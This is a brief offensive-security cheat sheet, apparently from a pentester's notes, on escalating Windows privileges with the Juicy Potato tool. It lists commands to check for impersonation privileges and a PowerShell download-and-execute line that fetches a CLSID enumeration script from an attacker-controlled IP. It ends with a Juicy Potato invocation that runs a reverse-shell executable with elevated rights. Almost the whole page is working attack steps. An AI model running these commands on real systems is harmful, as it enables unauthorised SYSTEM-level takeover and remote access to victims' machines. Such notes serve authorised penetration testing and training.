---
description: Potato yummy
---

# Potatoes

Enumerate either the`SeImpersonate` or `SeAssignPrimaryToken` privileges

```bash
whoami /priv
```

After identifying the appropriate privileges, upload the [Juicy Potato binary](https://github.com/ohpe/juicy-potato) to the host. Then run the following command to enumerate valid CLSID's for use with JuicyPotato&#x20;

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://[IP]/GetCLSID.ps1')
```

After enumerating a valid CLSID we can run the following command:&#x20;

```powershell
.\Juicy.exe -t t -p C:\Windows\Tasks\reverse.exe -l 5837 -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
```
